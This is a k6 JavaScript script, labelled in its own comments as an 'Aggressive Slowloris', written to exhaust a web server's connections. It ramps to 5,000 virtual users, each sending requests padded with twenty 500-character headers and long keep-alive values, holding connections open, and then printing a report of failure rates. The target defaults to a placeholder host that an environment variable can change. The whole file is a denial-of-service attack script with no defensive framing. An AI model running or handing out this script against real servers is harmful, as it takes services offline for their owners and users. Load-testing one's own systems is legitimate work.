import http from "k6/http";
import { sleep } from "k6";
import { Rate } from "k6/metrics";

const errorRate = new Rate("errors");

// =============================================================
// Aggressive Slowloris - Exhaust all server connections
// =============================================================

export const options = {
  scenarios: {
    // Open thousands of connections and hold them
    exhaust: {
      executor: "ramping-vus",
      startVUs: 0,
      stages: [
        { duration: "5s", target: 500 },
        { duration: "10s", target: 2000 },
        { duration: "30s", target: 5000 },
        { duration: "30s", target: 5000 },
        { duration: "10s", target: 0 },
      ],
    },
  },
  thresholds: {
    http_req_failed: [{ threshold: "rate<1.0", abortOnFail: false }],
  },
};

const TARGET = __ENV.TARGET_URL || "http://target:80";

// Generate large header padding
const PAD = "X".repeat(500);

export default function () {
  // Send request with huge headers to slow down processing
  const headers = {};
  for (let i = 0; i < 20; i++) {
    headers[`X-Pad-${i}`] = `${PAD}-${__VU}-${i}`;
  }
  headers["User-Agent"] = `slowloris/${__VU}`;
  headers["Connection"] = "keep-alive";
  headers["Keep-Alive"] = "timeout=300, max=1000";

  try {
    const res = http.get(`${TARGET}/`, {
      headers: headers,
      timeout: "120s",
    });
    errorRate.add(res.status !== 200);
  } catch (e) {
    errorRate.add(1);
  }

  // Hold the connection as long as possible
  sleep(Math.random() * 10 + 5);
}

export function handleSummary(data) {
  const m = data.metrics;
  console.log("\n========= SLOWLORIS REPORT =========");
  console.log(`Total Requests:  ${m.http_reqs.values.count}`);
  console.log(`Failed:          ${(m.http_req_failed.values.rate * 100).toFixed(1)}%`);
  console.log(`Error Rate:      ${(m.errors.values.rate * 100).toFixed(1)}%`);
  console.log(`Avg Duration:    ${m.http_req_duration.values.avg.toFixed(1)}ms`);
  console.log(`Max Duration:    ${m.http_req_duration.values.max.toFixed(1)}ms`);
  console.log("=====================================\n");
  return { stdout: JSON.stringify(m, null, 2) };
}
